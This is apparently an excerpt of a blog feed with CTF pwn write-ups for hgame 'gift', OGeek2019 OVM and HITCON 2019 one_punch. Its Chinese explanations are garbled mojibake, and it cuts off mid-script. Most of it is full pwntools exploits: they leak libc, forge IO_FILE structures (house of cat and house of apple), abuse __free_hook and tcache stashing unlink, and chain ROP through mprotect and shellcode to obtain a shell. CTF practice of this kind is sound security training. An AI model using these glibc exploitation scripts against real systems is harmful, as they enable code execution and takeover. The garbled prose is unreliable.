id="4nswerâ€™s-gift"><a href="#4nswerâ€™s-gift" class="headerlink" title="4nswerâ€™s gift"></a>4nswerâ€™s gift</h3><p>è¿™é“é¢˜ç™½ç»™äº†libcçš„åœ°å€ï¼Œå¹¶ä¸”ç›´æ¥è®©ä½ å»åŠ«æŒIOæ§åˆ¶æµï¼›è™½ç„¶æ²¡æœ‰ç»™å †åœ°å€ï¼Œé¢˜ç›®ç»™äº†æç¤ºLinuxå†…æ ¸ç‰ˆæœ¬ä¸º5.15ï¼Œå½“ç”³è¯·å †å—è¶³å¤Ÿå¤§æ—¶å°±ä¼šç›´æ¥è¿”å›ä¸€å—åœ¨libcä¸Šè¾¹çš„å†…å­˜ï¼Œä¸”åç§»å›ºå®šï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨house of catæˆ–è€…house of appleå®Œæˆæ”»å‡»ã€‚</p><p>â€‹</p><p>house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30252</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x400</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x1c0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(sys_addr)<br><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, fake_IO_FILE)<br><span class="hljs-comment">#pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>house of apple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30252</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span> <span class="hljs-comment">#0x290000 0x380000</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>p64(pop_rdi), p64(fake_addr - <span class="hljs-number">0x10</span>),<br>p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>p64(mprotect),<br>p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment">#print(hex(libcbase))</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ€ç§‘CVE-2020-3331</title>
    <link href="/2023/01/12/CVE-2020-3331/"/>
    <url>/2023/01/12/CVE-2020-3331/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuå¯’å‡ç»ƒä¹ 2</title>
    <link href="/2023/01/07/buu2/"/>
    <url>/2023/01/07/buu2/</url>
    
    <content type="html"><![CDATA[<h3 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h3><p>è¿™é“vmpwné¢˜åˆ†æèµ·æ¥å¹¶ä¸éš¾ï¼Œè¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œæœ€é«˜ä½çš„ä¸€å­—èŠ‚å¯¹åº”ç€æŒ‡ä»¤ï¼Œå‰©ä¸‹ä¸‰ä¸ªå­—èŠ‚å°±å¯¹åº”å¯„å­˜å™¨å’Œæ“ä½œæ•°ï¼Œè€Œæ¼æ´ä¹Ÿæ˜¯å¾ˆç»å…¸çš„æ•°ç»„è¶Šç•Œã€‚</p><p>æˆ‘è‡ªå·±åˆšå¼€å§‹å†™çš„æ—¶å€™æ€»æƒ³ç€å…ˆå°†gotè¡¨ä¸­çš„å€¼æ³„æ¼å‡ºæ¥ï¼Œå¾—åˆ°libcçš„åŸºåœ°å€åæ–¹ä¾¿å»å†™å…¥systemå‡½æ•°åœ°å€ï¼Œç¨‹åºè™½ç„¶æä¾›äº†æ‰“å°å¯„å­˜å™¨è¿™ä¸ªæŒ‡ä»¤ï¼Œä½†æ˜¯æ‰“å°åä¼šç«‹é©¬é€€å‡ºexecuteå‡½æ•°ï¼Œè¿™æ ·å°±æ— æ³•è¿›ä¸€æ­¥å»ä¿®æ”¹äº†ï¼›çœ‹åˆ°å…¶ä»–å¤§ä½¬å†™çš„<a href="https://www.cnblogs.com/lemon629/p/13975686.html">wp</a>åæ‰ååº”è¿‡æ¥å¯ä»¥åˆ©ç”¨gotè¡¨ä¸­åœ°å€çš„åç§»åŒæ ·å¯ä»¥å»ä¿®æ”¹ã€‚</p><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>åˆ©ç”¨æ•°ç»„è¶Šç•Œå¾—åˆ°gotè¡¨ä¸­çš„libcåœ°å€ï¼›</li><li>åˆ©ç”¨è¯¥åœ°å€åŠ æˆ–è€…å‡å»ä¸€æ®µåç§»å¾—åˆ°<code>__free_hook-8</code>çš„åœ°å€ï¼›</li><li>å°†<code>__free_hook-8</code>çš„åœ°å€å†™å…¥å…¨å±€å˜é‡commentä¸­ï¼›</li><li>é€€å‡ºexecuteå‡½æ•°æ‰“å°å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œåˆ©ç”¨ç¨‹åºæœ€åä¼šå‘commentä¸­çš„åœ°å€å†™å…¥å€¼å’Œfreeè¯¥åœ°å€çš„ç‰¹ç‚¹ï¼Œå†™å…¥å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;shâ€å’Œsystemå‡½æ•°åœ°å€ã€‚</li></ol><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25875</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcode</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0x7fffffff</span> :<br>        num = <span class="hljs-number">0xffffffff</span> - num + <span class="hljs-number">1</span><br>        num = <span class="hljs-built_in">str</span>(num)<br>        num = <span class="hljs-string">&#x27;-&#x27;</span>+num<br>    <span class="hljs-keyword">else</span> :<br>        num = <span class="hljs-built_in">str</span>(num)<br>    <span class="hljs-keyword">return</span> num.encode()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;PCPC:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;SP:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;CODE SIZE:&#x27;</span>, <span class="hljs-string">b&#x27;20&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;CODE:&#x27;</span>)<br><br>p.sendline(sendcode(<span class="hljs-number">0x10000038</span>))    <span class="hljs-comment">#reg0 = 0x38</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30040001</span>))    <span class="hljs-comment">#reg4 = memory[reg1]</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30050001</span>))    <span class="hljs-comment">#reg5 = memory[reg1]</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010008</span>))    <span class="hljs-comment">#reg1 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010009</span>))    <span class="hljs-comment">#reg1 = 9</span><br>p.sendline(sendcode(<span class="hljs-number">0x70000001</span>))    <span class="hljs-comment">#reg0 = reg0 + reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010004</span>))    <span class="hljs-comment">#reg1 = 4</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70040400</span>))    <span class="hljs-comment">#reg4 = reg4 + reg0</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000008</span>))    <span class="hljs-comment">#reg0 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40040001</span>))    <span class="hljs-comment">#memory[reg1] = reg4</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40050001</span>))    <span class="hljs-comment">#memory[reg1] = reg5</span><br><br><span class="hljs-comment">#p.sendline(sendcode(0xff000000))</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;R4: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;R5: &#x27;</span>)<br>leak = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span>) + leak<br>libcbase = leak + <span class="hljs-number">8</span> - libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><p>ç¨‹åºä¸»è¦é€šè¿‡callocåˆ†é…å †å—ï¼Œåˆ†é…æ—¶ä¸ä¼šä»tcacheå–å‡ºchunkï¼›è™½ç„¶æœ‰mallocå‡½æ•°ï¼Œä½†å¿…é¡»æ»¡è¶³<code>tcache_perthread_struct</code>ä¸­0x220å¤§å°çš„chunkçš„æ•°é‡è‡³å°‘ä¸º7æ‰å¯ä½¿ç”¨mallocåˆ†é…ï¼Œè¿™æ ·å°±æ— æ³•ç›´æ¥å»åˆ©ç”¨tcacheå»å®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>Tcache Stashing Unlink Attackå¯ä»¥å¾ˆå¥½å¾—è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attackåˆ©ç”¨æ€è·¯-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>â€‹</p><p>è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯å…ˆç”³è¯·5ä¸ª0x220å¤§å°çš„chunkæ”¾å…¥tcacheä¸­ï¼Œå¾—åˆ°2ä¸ª0x220å¤§å°small chunkåå†ä¿®æ”¹small binçš„æœ€åä¸€ä¸ª chunkçš„bkå€¼ ï¼š</p><img src="/img/10/Screenshot_20230113_045944.png" style="zoom:67%;" /><p>å†æ¬¡ä½¿ç”¨callocæ—¶ï¼Œä¼šå°†ä¿®æ”¹çš„bkå€¼ä¹Ÿå½“ä½œæ˜¯ä¸€ä¸ªçœŸæ­£çš„chunkæ”¾å…¥tcacheä¸­ï¼š</p><img src="/img/10/Screenshot_20230113_050011.png" style="zoom:67%;" /><p>â€‹</p><p>å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hitcon_ctf_2019_one_punch&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./hitcon_ctf_2019_one_punch&#x27;)</span><br>p =remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27110</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debut</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rename</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retire</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;50056&#x27;</span>)<br>    p.send(content)<br><br>debut(<span class="hljs-number">0</span> ,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x210</span>)<br>retire(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br><br>debut(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>retire(<span class="hljs-number">0</span>)<br>retire(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span> - <span class="hljs-number">0x220</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26542</span><br>pop_rsi = libcbase + <span class="hljs-number">0x26f9e</span><br>pop_rdx = libcbase + <span class="hljs-number">0x12bda6</span><br>pop_rax = libcbase + <span class="hljs-number">0x47cf8</span><br>syscall_ret = libcbase + <span class="hljs-number">0xcf6c5</span><br><br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span 